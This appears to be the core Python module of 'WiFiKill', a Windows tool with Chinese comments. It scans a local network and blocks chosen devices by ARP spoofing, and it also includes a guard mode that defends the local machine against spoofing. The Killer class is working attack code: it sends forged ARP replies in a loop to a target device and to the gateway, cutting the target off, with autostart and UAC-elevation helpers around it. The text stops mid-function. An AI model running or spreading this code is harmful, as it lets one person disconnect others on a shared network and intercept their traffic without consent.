#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
core.py — WiFiKill 逻辑层

职责：网络发现、ARP 阻断、白名单与状态持久化、环境自检。
约束：不向 stdout 输出任何内容（GUI 打包为 --windowed 时 stdout 为 None），
      所有消息通过 logger 回调派发。
"""

from __future__ import annotations

import json
import logging
import os
import re
import socket
import struct
import subprocess
import sys
import threading
import time
from dataclasses import dataclass, asdict
from pathlib import Path

try:
    import winreg  # Windows 注册表；非 Windows 下置 None
except ImportError:
    winreg = None

WINDOWS = os.name == "nt"
BROADCAST = "ff:ff:ff:ff:ff:ff"
APP_NAME = "WiFiKill"
APP_VERSION = "2.4.0"

if getattr(sys, "frozen", False):
    APP_DIR = Path(sys.executable).resolve().parent
else:
    APP_DIR = Path(__file__).resolve().parent

STATE_FILE = APP_DIR / ".wifikill-state.json"
WHITELIST_FILE = APP_DIR / "whitelist.txt"
ALIAS_FILE = APP_DIR / "aliases.json"   # 设备备注：mac/ip → 名字
LOCK_PORT = 51999

_MAC_RE = re.compile(r"^([0-9a-f]{2}:){5}[0-9a-f]{2}$")
_IP_RE = re.compile(r"^(\d{1,3}\.){3}\d{1,3}$")


# ------------------------------------------------------------------ 基础工具


def log_levels():
    return ("debug", "info", "ok", "warn", "err")


class Logger:
    """线程安全的回调式日志；无订阅者时静默。"""

    def __init__(self):
        self._sinks = []
        self._lock = threading.Lock()

    def subscribe(self, fn):
        with self._lock:
            self._sinks.append(fn)

    def emit(self, level: str, msg: str):
        with self._lock:
            sinks = list(self._sinks)
        for fn in sinks:
            try:
                fn(level, msg)
            except Exception:
                pass


LOG = Logger()


def resource_path(name: str) -> str:
    """取随包分发的资源文件路径。

    PyInstaller onefile 会把资源解到 sys._MEIPASS，源码运行时就在脚本旁边。
    """
    base = getattr(sys, "_MEIPASS", os.path.dirname(os.path.abspath(__file__)))
    path = os.path.join(base, name)
    return path if os.path.exists(path) else ""


def _run_hidden(cmd: list[str], encoding: str) -> str:
    """执行外部命令且不弹出控制台窗口（GUI 打包必需）。"""
    kwargs = {}
    if WINDOWS:
        kwargs["creationflags"] = getattr(subprocess, "CREATE_NO_WINDOW", 0x08000000)
    try:
        p = subprocess.run(cmd, capture_output=True, encoding=encoding,
                           errors="replace", timeout=10, **kwargs)
        return p.stdout or ""
    except Exception:
        return ""


# ------------------------------------------------------------------ 厂商库

BUILTIN_OUI = {
    "000C29": "VMware", "005056": "VMware", "000569": "VMware",
    "080027": "VirtualBox", "0A0027": "VirtualBox",
    "001C42": "Parallels", "525400": "QEMU/KVM", "00163E": "Xen",
    "00155D": "Microsoft Hyper-V",
    "B827EB": "Raspberry Pi", "DCA632": "Raspberry Pi", "E45F01": "Raspberry Pi",
    "240AC4": "Espressif", "30AEA4": "Espressif", "7C9EBD": "Espressif",
    "84F3EB": "Espressif", "AC67B2": "Espressif", "C44F33": "Espressif",
    "3C6105": "Espressif", "8CAAB5": "Espressif", "246F28": "Espressif",
    "001D0F": "TP-Link", "50C7BF": "TP-Link", "A42BB0": "TP-Link",
    "14CC20": "TP-Link", "C46E1F": "TP-Link",
    "001B63": "Apple", "0023DF": "Apple", "001EC2": "Apple",
    "3C0754": "Apple", "68A86D": "Apple", "8C8590": "Apple",
    "A483E7": "Apple", "F01898": "Apple", "D0817A": "Apple",
    "0012FB": "Samsung", "3423BA": "Samsung", "5C0A5B": "Samsung",
    "8C7712": "Samsung", "C0BDD1": "Samsung", "E8508B": "Samsung",
    "286C07": "Xiaomi", "64B473": "Xiaomi", "7811DC": "Xiaomi",
    "508F4C": "Xiaomi", "34CE00": "Xiaomi", "F8A45F": "Xiaomi",
    "00E0FC": "Huawei", "4846FB": "Huawei", "70723C": "Huawei",
    "8853D4": "Huawei", "ACE215": "Huawei", "D07AB5": "Huawei",
    "001B21": "Intel", "3C970E": "Intel", "8C1645": "Intel",
    "001E37": "Hewlett-Packard", "00248C": "ASUSTek",
}

VENDOR_TYPE = [
    (("apple", "xiaomi", "samsung", "huawei", "oppo", "vivo", "oneplus",
      "realme", "meizu", "honor"), "移动设备"),
    (("espressif", "raspberry"), "智能家居"),
    (("tp-link", "tenda", "netgear", "asus", "h3c", "ruijie"), "网络设备"),
    (("vmware", "virtualbox", "qemu", "xen", "parallels", "hyper-v"), "虚拟机"),
    (("intel", "realtek", "hewlett", "dell", "lenovo", "micro-star"), "电脑"),
]

_oui_cache: dict[str, str] | None = None
_oui_lock = threading.Lock()


def oui_table(extra_path: str | None = None) -> dict[str, str]:
    global _oui_cache
    with _oui_lock:
        if _oui_cache is None:
            _oui_cache = dict(BUILTIN_OUI)
            if extra_path:
                _merge_oui(_oui_cache, extra_path)
        return _oui_cache


def _merge_oui(table: dict, path: str):
    p = Path(path)
    if not p.exists():
        LOG.emit("warn", f"OUI 文件不存在：{p}")
        return
    n = 0
    for line in p.read_text(encoding="utf-8", errors="replace").splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if "," in line:
            parts = [x.strip() for x in line.split(",")]
            if len(parts) >= 3 and re.fullmatch(r"[0-9A-Fa-f]{6}", parts[1]):
                table[parts[1].upper()] = parts[2]
                n += 1
        else:
            parts = line.split(None, 1)
            if len(parts) == 2:
                key = parts[0].replace(":", "").replace("-", "").upper()
                if re.fullmatch(r"[0-9A-F]{6}", key):
                    table[key] = parts[1]
                    n += 1
    LOG.emit("info", f"已加载自定义 OUI {n} 条")


def lookup_vendor(mac: str, table: dict[str, str]) -> str:
    prefix = mac.replace(":", "").upper()[:6]
    if not prefix or prefix in ("000000", "FFFFFF"):
        return "—"
    if prefix in table:
        return table[prefix]
    try:
        if int(prefix[1], 16) & 0x2:
            return "随机 MAC"
    except ValueError:
        pass
    return "—"


def guess_type(vendor: str) -> str:
    v = vendor.lower()
    if vendor == "随机 MAC":
        return "移动设备?"
    for keys, label in VENDOR_TYPE:
        if any(k in v for k in keys):
            return label
    return "—"


# ------------------------------------------------------------------ 环境


_scapy = None
_scapy_lock = threading.Lock()


def scapy_mod():
    global _scapy
    with _scapy_lock:
        if _scapy is None:
            logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
            logging.getLogger("scapy.loading").setLevel(logging.ERROR)
            try:
                import scapy.all as s
                _scapy = s
            except Exception as e:
                LOG.emit("err", f"scapy 加载失败：{e}")
                return None
        return _scapy


def scapy_version() -> str:
    try:
        import scapy
        return getattr(scapy, "VERSION", "?")
    except Exception:
        return "?"


def is_admin() -> bool:
    if not WINDOWS:
        try:
            return os.geteuid() == 0
        except Exception:
            return False
    try:
        import ctypes
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False


def l2_check() -> tuple[str, str]:
    """返回 (阻断码, 说明)。

    只判定"确定无法工作"的条件：ok / no_scapy / no_npcap。
    不提管理员：Npcap 的驱动权限因安装选项而异，实测存在非管理员可发送的情况，
    以管理员为硬门槛会造成假阴性。真实权限不足会在 sendp 时以异常暴露。
    """
    s = scapy_mod()
    if s is None:
        return "no_scapy", "scapy 未加载"
    if WINDOWS:
        try:
            use_pcap = s.conf.use_pcap
        except Exception:
            use_pcap = False
        if not use_pcap:
            return "no_npcap", "未安装 Npcap（发送二层帧必需）"
    return "ok", "ok"


def relaunch_elevated(extra_args: list[str] | None = None) -> bool:
    if not WINDOWS or is_admin():
        return False
    try:
        import ctypes
        target = sys.executable
        args = list(extra_args or [])
        params = subprocess.list2cmdline(args)
        rc = ctypes.windll.shell32.ShellExecuteW(
            None, "runas", target, params, None, 1)
        return rc > 32
    except Exception:
        return False


# ------------------------------------------------------------------ 开机自启

RUN_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
AUTOSTART_NAME = "WiFiKill"


def autostart_enabled() -> bool:
    """是否已写入 Run 键（开机自动启动）。"""
    if not WINDOWS or winreg is None:
        return False
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY) as k:
            try:
                val, _ = winreg.QueryValueEx(k, AUTOSTART_NAME)
                return bool(val)
            except FileNotFoundError:
                return False
    except Exception:
        return False


def set_autostart(enable: bool) -> bool:
    """写/删 Run 键实现开机自动启动。HKCU 不需要管理员即可写入；
    真正以管理员身份运行由 exe 的 UAC 清单（uac_admin）保证。

    返回是否成功。失败（如权限不足）时由调用方提示用户。
    """
    if not WINDOWS or winreg is None:
        return False
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY, 0,
                            winreg.KEY_SET_VALUE) as k:
            if enable:
                val = f'"{sys.executable}" --minimized'
                winreg.SetValueEx(k, AUTOSTART_NAME, 0, winreg.REG_SZ, val)
            else:
                try:
                    winreg.DeleteValue(k, AUTOSTART_NAME)
                except FileNotFoundError:
                    pass
        return True
    except Exception as e:
        LOG.emit("warn", f"设置开机自启失败：{e}")
        return False


# ------------------------------------------------------------------ 守护设置

GUARD_FILE = APP_DIR / "guard.json"


def guard_enabled() -> bool:
    """是否开启了「本机守护（主动防御）」。"""
    try:
        if GUARD_FILE.exists():
            return bool(json.loads(GUARD_FILE.read_text(encoding="utf-8")).get("enabled", False))
    except Exception:
        pass
    return False


def set_guard_enabled(enable: bool) -> bool:
    """持久化守护开关；返回是否成功（理论上不会失败，除非程序目录只读）。"""
    try:
        tmp = GUARD_FILE.with_suffix(".tmp")
        tmp.write_text(json.dumps({"enabled": bool(enable)}, ensure_ascii=False, indent=2),
                      encoding="utf-8")
        os.replace(tmp, GUARD_FILE)
        return True
    except Exception as e:
        LOG.emit("warn", f"保存守护设置失败：{e}")
        return False


# ------------------------------------------------------------------ 网络信息


@dataclass
class NetInfo:
    iface: str = ""
    my_ip: str = ""
    my_mac: str = ""
    gateway_ip: str = ""
    gateway_mac: str = ""
    cidr: str = ""
    iface_name: str = ""

    @property
    def ready(self) -> bool:
        return bool(self.my_ip and self.gateway_ip)


def friendly_iface(npif: str) -> str:
    """把 \\Device\\NPF_{GUID} 换成可读的网卡描述。"""
    s = scapy_mod()
    if s is not None and npif:
        try:
            for iface in s.conf.ifaces.values():
                if getattr(iface, "network_name", "") == npif:
                    desc = (getattr(iface, "description", "") or "").strip()
                    alias = (getattr(iface, "name", "") or "").strip()
                    if desc and alias:
                        return f"{alias} · {desc}"
                    return desc or alias or npif
        except Exception:
            pass
    return npif


def local_mac() -> str:
    if WINDOWS:
        out = _run_hidden(["getmac", "/fo", "csv", "/nh"], "gbk")
        for line in out.splitlines():
            m = re.search(r"([0-9A-F]{2}-){5}[0-9A-F]{2}", line, re.I)
            if m:
                return m.group(0).replace("-", ":").lower()
    return "00:00:00:00:00:00"


def cidr_range(cidr: str) -> tuple[int, int]:
    try:
        net_s, _, plen_s = cidr.partition("/")
        plen = int(plen_s or 24)
        mask = (0xFFFFFFFF << (32 - plen)) & 0xFFFFFFFF
        ip_int = struct.unpack("!I", socket.inet_aton(net_s))[0]
        return ip_int & mask, mask
    except Exception:
        return 0, 0


def same_subnet(ip: str, cidr: str) -> bool:
    net, mask = cidr_range(cidr)
    if mask == 0:
        return True
    try:
        return (struct.unpack("!I", socket.inet_aton(ip))[0] & mask) == net
    except Exception:
        return False


def get_netinfo(cidr: str | None = None) -> NetInfo:
    s = scapy_mod()
    ni = NetInfo()
    if s is not None:
        try:
            iface, my_ip, gw = s.conf.route.route("0.0.0.0")
            ni.iface, ni.my_ip, ni.gateway_ip = iface, my_ip, gw
            try:
                ni.my_mac = s.get_if_hwaddr(iface)
            except Exception:
                pass
        except Exception as e:
            LOG.emit("warn", f"路由探测失败：{e}")
    if not ni.my_mac or ni.my_mac == "00:00:00:00:00:00":
        ni.my_mac = local_mac()

    prefix, net_int = 24, None
    if s is not None and ni.my_ip:
        try:
            ip_int = struct.unpack("!I", socket.inet_aton(ni.my_ip))[0]
            best = None
            for net, mask, _g, _ifc, addr, _m in s.conf.route.routes:
                if addr != ni.my_ip or net == 0:
                    continue
                if bin(mask).count("1") >= 31:
                    continue
                if (ip_int & mask) == (net & mask):
                    if best is None or bin(mask).count("1") > bin(best).count("1"):
                        best = mask
            if best:
                prefix = bin(best).count("1")
                net_int = ip_int & best
        except Exception as e:
            LOG.emit("debug", f"网段探测异常：{e}")

    if ni.iface:
        ni.iface_name = friendly_iface(ni.iface)

    if cidr:
        ni.cidr = cidr
    elif net_int is not None:
        ni.cidr = f"{socket.inet_ntoa(struct.pack('!I', net_int))}/{prefix}"
    elif ni.my_ip:
        ni.cidr = f"{ni.my_ip}/24"
    return ni


def arp_table() -> dict[str, str]:
    if WINDOWS:
        out = _run_hidden(["arp", "-a"], "gbk")
    else:
        out = _run_hidden(["arp", "-an"], "utf-8")
    table: dict[str, str] = {}
    for line in out.splitlines():
        m = re.search(r"(\d{1,3}(?:\.\d{1,3}){3})\D+((?:[0-9a-fA-F]{2}[:-]){5}[0-9a-fA-F]{2})", line)
        if not m:
            continue
        ip, mac = m.group(1), m.group(2).replace("-", ":").lower()
        if mac == BROADCAST or mac.startswith("01:00:5e"):
            continue
        if ip.startswith(("224.", "239.", "255.")):
            continue
        table[ip] = mac
    return table


# ------------------------------------------------------------------ 设备


@dataclass
class Device:
    ip: str
    mac: str
    vendor: str = "—"
    dtype: str = "—"
    note: str = ""
    state: str = "未阻断"


def is_protected(d: Device) -> bool:
    """设备是否受保护（网关 / 本机）。受保护设备在任何路径下都不可被阻断。

    这是安全不变量：阻断网关会切断整个网络，阻断本机会让自己失联。
    单目标选择与「全阻断」都必须遵守，因此抽成纯函数并纳入测试。
    """
    return d.note in ("网关", "本机")


def scan(ni: NetInfo, timeout: float = 3.0, active: bool = True) -> tuple[list[Device], bool]:
    """返回 (设备列表, 是否包含主动扫描结果)

    主动扫描可能比系统 ARP 缓存少（休眠设备不回 ARP），因此两路结果合并，
    主动结果覆盖缓存结果，避免漏设备。
    """
    cached = {ip: mac for ip, mac in arp_table().items()
              if same_subnet(ip, ni.cidr)}
    active_found: dict[str, str] = {}
    if active:
        s = scapy_mod()
        code, _ = l2_check()
        if s is not None and code == "ok":
            try:
                pkt = s.Ether(dst=BROADCAST) / s.ARP(pdst=ni.cidr)
                ans, _ = s.srp(pkt, timeout=timeout, iface=ni.iface,
                               verbose=0, inter=0.01)
                for _, r in ans:
                    active_found[r.psrc] = r.hwsrc.lower()
            except Exception as e:
                LOG.emit("debug", f"主动扫描失败：{e}")

    found = dict(cached)
    found.update(active_found)
    used_active = bool(active_found)

    table = oui_table()
    devs = []
    for ip, mac in sorted(found.items(), key=lambda x: tuple(map(int, x[0].split(".")))):
        v = lookup_vendor(mac, table)
        d = Device(ip=ip, mac=mac, vendor=v, dtype=guess_type(v))
        if ip == ni.gateway_ip:
            d.note = "网关"
        elif ip == ni.my_ip:
            d.note = "本机"
        devs.append(d)
    return devs, used_active


def arp_query(ip: str, ni: NetInfo) -> str | None:
    s = scapy_mod()
    code, _ = l2_check()
    if s is None or code != "ok":
        return None
    try:
        ans, _ = s.srp(s.Ether(dst=BROADCAST) / s.ARP(pdst=ip),
                       timeout=2, iface=ni.iface, verbose=0)
        for _, r in ans:
            return r.hwsrc.lower()
    except Exception:
        pass
    return None


def resolve_mac(ip: str, ni: NetInfo) -> str | None:
    if ip == ni.my_ip:
        return ni.my_mac
    if ip == ni.gateway_ip and ni.gateway_mac:
        return ni.gateway_mac
    mac = arp_table().get(ip)
    if mac:
        return mac
    mac = arp_query(ip, ni)
    if mac:
        return mac
    # 回退：全段扫一次
    try:
        devs, _ = scan(ni, 2.0, active=True)
        for d in devs:
            if d.ip == ip:
                return d.mac
    except Exception:
        pass
    return None


# ------------------------------------------------------------------ 状态持久化


_state_lock = threading.Lock()


def load_state() -> dict:
    try:
        if STATE_FILE.exists():
            return json.loads(STATE_FILE.read_text(encoding="utf-8"))
    except Exception as e:
        LOG.emit("warn", f"状态文件损坏，已忽略：{e}")
    return {}


def write_state(data: dict | None):
    """原子写入；data 为 None 表示删除。"""
    with _state_lock:
        try:
            if not data or not data.get("targets"):
                if STATE_FILE.exists():
                    STATE_FILE.unlink()
                return
            tmp = STATE_FILE.with_suffix(".tmp")
            tmp.write_text(json.dumps(data, indent=2), encoding="utf-8")
            os.replace(tmp, STATE_FILE)
        except Exception as e:
            LOG.emit("warn", f"状态写入失败：{e}")


def clear_state():
    write_state(None)


def load_whitelist() -> set[str]:
    if not WHITELIST_FILE.exists():
        return set()
    out = set()
    for line in WHITELIST_FILE.read_text(encoding="utf-8", errors="replace").splitlines():
        line = line.strip().lower()
        if line and not line.startswith("#"):
            out.add(line)
    return out


def load_aliases() -> dict[str, str]:
    """读设备备注。键是 MAC 或 IP，值是用户起的名字。"""
    try:
        data = json.loads(ALIAS_FILE.read_text(encoding="utf-8"))
    except Exception:
        return {}
    out = {}
    for k, v in (data or {}).items():
        if isinstance(v, str) and v.strip():
            out[str(k).lower()] = v.strip()
    return out


def save_aliases(items: dict[str, str]) -> None:
    """原子写备注，避免崩溃留下半个 JSON。"""
    tmp = ALIAS_FILE.with_suffix(".tmp")
    tmp.write_text(json.dumps(items, ensure_ascii=False, indent=2),
                   encoding="utf-8")
    os.replace(tmp, ALIAS_FILE)


def save_whitelist(items: set[str]):
    try:
        WHITELIST_FILE.write_text(
            "\n".join(sorted(items)) + ("\n" if items else ""), encoding="utf-8")
    except Exception as e:
        LOG.emit("warn", f"白名单写入失败：{e}")


# ------------------------------------------------------------------ 阻断器


@dataclass
class Target:
    ip: str
    mac: str
    note: str = ""

    def key(self) -> str:
        return self.ip


class BlockError(RuntimeError):
    pass


class Killer:
    """ARP 双向投毒会话。所有失败都以 BlockError / 日志呈现，不静默。"""

    def __init__(self, ni: NetInfo, interval: float = 1.5, dry_run: bool = False):
        self.ni = ni
        self.interval = max(0.3, float(interval))
        self.dry_run = dry_run
        self._targets: dict[str, Target] = {}
        self._lock = threading.RLock()
        self._stop = threading.Event()
        self._thread: threading.Thread | None = None
        self._started = False
        self._send_errors = 0

    # --- 状态 ---

    def targets(self) -> list[Target]:
        with self._lock:
            return list(self._targets.values())

    def is_active(self) -> bool:
        return self._thread is not None and self._thread.is_alive() and not self._stop.is_set()

    # --- 报文 ---

    def _frames(self, t: Target, restore: bool):
        s = scapy_mod()
        if s is None:
            raise BlockError("scapy 不可用")
        gw_ip, gw_mac = self.ni.gateway_ip, self.ni.gateway_mac
        if not _MAC_RE.match(gw_mac or ""):
            raise BlockError(f"网关 MAC 无效（{gw_mac!r}），拒绝投毒")
        if not _MAC_RE.match(t.mac or ""):
            raise BlockError(f"目标 MAC 无效（{t.mac!r}）")
        src = gw_mac if restore else self.ni.my_mac
        src_t = t.mac if restore else self.ni.my_mac
        to_target = (s.Ether(dst=t.mac) /
                     s.ARP(op=2, hwsrc=src, psrc=gw_ip, hwdst=t.mac, pdst=t.ip))
        to_gw = (s.Ether(dst=gw_mac) /
                 s.ARP(op=2, hwsrc=src_t, psrc=t.ip, hwdst=gw_mac, pdst=gw_ip))
        return to_target, to_gw

    def _emit(self, t: Target, restore: bool = False, count: int = 1):
        s = scapy_mod()
        frames = self._frames(t, restore)
        for f in frames:
            if self.dry_run:
                LOG.emit("debug", f"[演练] 告知 {f[1].pdst} ← {f[1].psrc} 的 MAC 是 {f[1].hwsrc}")
                continue
            try:
                s.sendp(f, iface=self.ni.iface, verbose=0, count=count)
            except Exception as e:
                self._send_errors += 1
                raise BlockError(f"发送失败：{e}") from e

    # --- 生命周期 ---

    def start(self):
        with self._lock:
            if self.is_active():
                return
            self._stop.clear()
            self._thread = threading.Thread(target=self._loop, daemon=True,
                                            name="wifikill-poison")
            self._started = True
            self._thread.start()

    def _loop(self):
        while not self._stop.is_set():
            with self._lock:
                targets = list(self._targets.values())
            for t in targets:
                if self._stop.is_set():
                    break
                try:
                    self._emit(t)
                except BlockError as e:
                    LOG.emit("warn", f"{t.ip} {e}")
                except Exception as e:
                    LOG.emit("warn", f"{t.ip} 投毒异常：{e}")
            self._stop.wait(self.interval)

    def _is_protected_target(self, t: Target) -> bool:
        """目标是否指向网关 / 本机（IP 或 MAC 命中其一即拒绝，与 is_protected 同源）。

        这是安全不变量的 API 层强制：GUI 已经过滤过一次，但这里必须再挡一道 ——
        任何直接调用 core 的代码路径（插件、脚本、未来的 UI）都不能绕过这道门。

        为什么 IP 与 MAC 要「独立」判定（对抗性审查第 4 轮由回归测试逼出）：
        - 用网关 IP 作目标：to_target 的 psrc=gw_ip，等于告诉全网「网关 IP → 攻击方 MAC」，全家断网。
        - 用网关 MAC 作目标（IP 随便）：帧的以太 dst 是网关 MAC、且 psrc=gw_ip，
          网关会收到一条「我自己(gw_ip) 在攻击方 MAC 上」的 ARP 应答，污染网关自身映射。
        - 本机同理。所以只要 IP 或 MAC 任一命中网关/本机，就必须拒绝。
        """
        ni = self.ni
        t_mac = (t.mac or "").lower()
        bad_ips = {ni.gateway_ip, ni.my_ip}
        bad_macs = {(ni.gateway_mac or "").lower(), (ni.my_mac or "").lower()}
        if t.ip in bad_ips:
            return True
        if t_mac and t_mac in bad_macs:
            return True
        return False

    def add(self, t: Target) -> None:
        if not self._started and not self.dry_run:
            code, _ = l2_check()
            if code != "ok":
                raise BlockError("二层不可用，无法阻断")
        # 安全不变量在 API 层强制：网关 / 本机在任何路径下都不可被阻断。
        if self._is_protected_target(t):
            raise BlockError("受保护设备（网关/本机）不可被阻断")
        self._frames(t, restore=False)   # 先验证报文可构造
        with self._lock:
            self._targets[t.key()] = t
        self._emit(t, count=3)
        self.persist()

    def remove(self, ip: str) -> bool:
        with self._lock:
            t = self._targets.pop(ip, None)
        if t:
            try:
                self._emit(t, restore=True, count=5)
            except Exception as e:
                LOG.emit("warn", f"恢复 {ip} 失败：{e}")
                # 恢复失败要放回队列，避免"以为放行了其实还断着"
                with self._lock:
                    self._targets[ip] = t
                return False
        self.persist()
        return True

    def restore_all(self) -> int:
        """停止并恢复全部目标，返回成功条数。"""
        self.stop()
        with self._lock:
            items = list(self._targets.values())
            self._targets.clear()
        ok = 0
        for t in items:
            try:
                self._emit(t, restore=True, count=5)
                ok += 1
            except Exception as e:
                LOG.emit("warn", f"恢复 {t.ip} 失败：{e}")
                with self._lock:
                    self._targets[t.ip] = t
        if not self._targets:
            clear_state()
        else:
            self.persist()
        return ok

    def stop(self):
        self._stop.set()
        th = self._thread
        if th and th.is_alive():
            th.join(timeout=3)

    def persist(self):
        if self.dry_run:
            return          # 演练模式只打印报文，绝不能留下阻断状态
        with self._lock:
            items = [asdict(t) for t in self._targets.values()]
        write_state({
            "updated": time.time(),
            "iface": self.ni.iface,
            "my_mac": self.ni.my_mac,
            "gateway_ip": self.ni.gateway_ip,
            "gateway_mac": self.ni.gateway_mac,
            "targets": items,
        })


# ------------------------------------------------------------------ 本机守护（主动防御）

class Guard:
    """本机主动防御：即使不主动阻断任何设备，也持续守护本机免遭外部 ARP/NDP 投毒。

    原理：周期性核对本地 ARP（以及 IPv6 NDP）缓存中「网关 IP/LLA → MAC」映射，
    是否仍是启动时确认的*真实*网关 MAC。若发现被改写成别的 MAC（典型投毒特征），
    在去抖后记录异常，并重新向本机宣告「网关的真实 MAC」，把被篡改的缓存纠正回来。

    安全不变量（对抗性审查逐条硬化）：
    - 只发送「网关 IP ↔ 真实网关 MAC」这一条*真实*映射，绝不伪造任何第三方地址。
    - 不触碰网关以外的任何 IP/MAC，不向任何第三方投毒。
    - 没有可靠的网关 MAC 基准时绝不发送任何包（避免把错误映射钉死）。
    - IPv6 重宣告一律单播到本机 MAC，绝不发往组播/广播（避免波及整网）。
    - dry_run 仅记录，不发送真实包。
    """

    def __init__(self, ni: "NetInfo", interval: float = 2.0, dry_run: bool = False):
        self.ni = ni
        self.interval = max(1.0, float(interval))
        self.dry_run = dry_run
        self.v6env = None  # 由 GUI 在扫描后注入 ipv6.V6Env（含 gw_lla / my_lla）
        self._stop = threading.Event()
        self._thread: threading.Thread | None = None
        self._lock = threading.Lock()
        self._gw_ip = (ni.gateway_ip or "").strip()
        self._gw_mac = ""
        self.last_check = 0.0
        self.anomaly_count = 0
        self.last_anomaly_time = 0.0
        self._consecutive = 0
        self._failed_corr = 0   # 漂移纠正后仍未恢复的连续次数（用于判断基准过时）
        self._last_action = "待命"
        # IPv6 上下文：(gw_lla, gw_mac, my_lla, iface)
        self._v6: tuple[str, str, str, str] | None = None
        self._v6_counter = 0

    # --- 基准建立 ---

    def _establish_baseline(self, *, strict: bool = False) -> str:
        """确认受信任的网关 MAC：优先用扫描得到的 ni.gateway_mac，否则主动 ARP 询问。

        对抗性加固：若缓存里的网关 MAC 与一次「实时 ARP 询问」返回的 MAC 不一致，
        说明两者有分歧 —— 很可能缓存已被投毒、或本网段真有冲突。此刻不启动发包，
        「fail closed」比「把某个可疑 MAC 钉死」更安全。

        strict=True（重估场景）：必须「缓存有效 且 实时可答 且 两者一致」才返回基准。
        实时询问失败时静默信任缓存只在启动场景可接受（缓存来自刚完成的扫描）；
        重估发生在可疑状态下，单源证据一律拒绝 —— 攻击者改写的缓存不能自证。
        """
        from_cache = (self.ni.gateway_mac or "").lower()
        if _MAC_RE.match(from_cache or ""):
            try:
                live = arp_query(self._gw_ip, self.ni)
            except Exception:
                live = None
            if live and live.lower() != from_cache:
                LOG.emit("warn",
                         f"守护基线分歧：缓存 {from_cache} ≠ 实时询问 {live.lower()}，"
                         f"疑似缓存已被投毒，守护不启动以避免钉死错误映射")
                return ""
            if strict and not live:
                LOG.emit("warn", "守护基准重估：实时询问不可用，单源证据不足，拒绝采纳")
                return ""
            return from_cache
        if strict:
            # strict 模式下没有缓存作对照，实时应答无法自证可信
            LOG.emit("warn", "守护基准重估：缺少扫描缓存对照，拒绝单源采纳")
            return ""
        try:
            got = arp_query(self._gw_ip, self.ni)
            if got:
                return got.lower()
        except Exception as e:
            LOG.emit("debug", f"守护基准探测失败：{e}")
        return ""

    # --- 状态 ---

    def is_active(self) -> bool:
        return self._thread is not None and self._thread.is_alive() and not self._stop.is_set()

    def status(self) -> dict:
        with self._lock:
            return {
                "active": self.is_active(),
                "gw_ip": self._gw_ip,
                "gw_mac": self._gw_mac,
                "last_check": self.last_check,
                "anomaly_count": self.anomaly_count,
                "last_action": self._last_action,
                "v6": self._v6 is not None,
            }

    # --- 生命周期 ---

    def start(self) -> bool:
        if self.is_active():
            return True
        # 防并发：上一次 stop() 后旧线程可能仍在收尾（sendp 未返回等），
        # 必须等它真正退出再开新线程，避免两个守护线程同时 _tick 重复发包。
        old = self._thread
        if old is not None and old.is_alive():
            old.join(timeout=3)
            if old.is_alive():
                LOG.emit("warn", "守护本机：旧守护线程尚未退出，本次不启动（避免并发双线程）")
                return False
        gw_ip = (self.ni.gateway_ip or "").strip()
        if not gw_ip:
            LOG.emit("warn", "守护本机：缺少网关 IP，无法启动")
            return False
        self._gw_ip = gw_ip
        base = self._establish_baseline()
        if not base:
            # 没有可靠基准就不发包：宁可什么都不做，也绝不把错误映射钉死。
            LOG.emit("warn", "守护本机：无法确认网关真实 MAC，不启动发包")
            return False
        with self._lock:
            self._gw_mac = base
            self._v6 = None
            self._consecutive = 0
            self._failed_corr = 0
            self._last_action = "守护中"
        env = self.v6env
        if env is not None and getattr(env, "supported", False) and env.gw_lla \
                and env.gw_mac and getattr(env, "my_lla", ""):
            with self._lock:
                self._v6 = (env.gw_lla, env.gw_mac.lower(), env.my_lla, self.ni.iface)
        code, _ = l2_check()
        if code != "ok":
            LOG.emit("warn", f"守护本机：二层不可用（{code}），仅做监控不发包")
        self._stop.clear()
        self._thread = threading.Thread(target=self._loop, daemon=True,
                                       name="wifikill-guard")
        self._thread.start()
        LOG.emit("ok", f"本机守护已启动：网关 {self._gw_ip} 基准 MAC {self._gw_mac}"
                      + ("（含 IPv6 重宣告）" if self._v6 else ""))
        return True

    def stop(self):
        self._stop.set()
        th = self._thread
        if th is not None and th.is_alive():
            th.join(timeout=3)
        self._thread = None
        with self._lock:
            self._last_action = "已停止"
        LOG.emit("info", "本机守护已停止")

    # --- 主循环 ---

    def _loop(self):
        while not self._stop.is_set():
            try:
                self._tick()
            except Exception as e:
                LOG.emit("warn", f"守护本机异常：{e}")
            self._stop.wait(self.interval)

    def _tick(self):
        now = time.time()
        with self._lock:
            self.last_check = now
            gw_ip = self._gw_ip
            gw_mac = self._gw_mac
            v6 = self._v6
        if not gw_ip or not gw_mac:
            return

        # ---- 网络切换检测：GUI 每次扫描都会把最新 ni 注入 self.ni ----
        cur_gw_ip = (self.ni.gateway_ip or "").strip()
        if cur_gw_ip and cur_gw_ip != gw_ip:
            # 网关 IP 变了（换了 Wi-Fi/网卡/网段）：旧基准整体作废。
            # 新基准仍走「缓存+实时一致才采纳」的完整建立流程。
            with self._lock:
                self._gw_ip = cur_gw_ip
            LOG.emit("warn", f"检测到网关 IP 变化：{gw_ip} → {cur_gw_ip}，重建守护基准")
            self._rebaseline()
            return

        # ---- IPv4 ARP 监控 + 纠正 ----
        table = arp_table()
        cur = (table.get(gw_ip) or "").lower()
        with self._lock:
            if not cur:
                # 缓存缺失与漂移共用去抖：arp_table 偶发解析失败（命令超时返回空表）
                # 不应立即触发全网广播，连续 2 次缺失才重新宣告。
                self._consecutive += 1
                n, missing = self._consecutive, True
            elif cur == gw_mac:
                self._consecutive = 0
                self._failed_corr = 0
                n, missing = 0, False
            else:
                self._consecutive += 1
                n, missing = self._consecutive, False
        if n >= 2:
            if missing:
                LOG.emit("info", f"网关 {gw_ip} 缓存持续缺失，重新宣告真实映射")
                self._reassert("缓存缺失")
            else:
                with self._lock:
                    self.anomaly_count += 1
                    self.last_anomaly_time = now
                    self._failed_corr += 1
                    fc = self._failed_corr
                LOG.emit("warn",
                         f"检测到网关 MAC 漂移：缓存 {cur} ≠ 真实 {gw_mac}，"
                         f"疑似 ARP 投毒，已自动纠正")
                self._reassert("MAC 漂移")
                if fc >= 3:
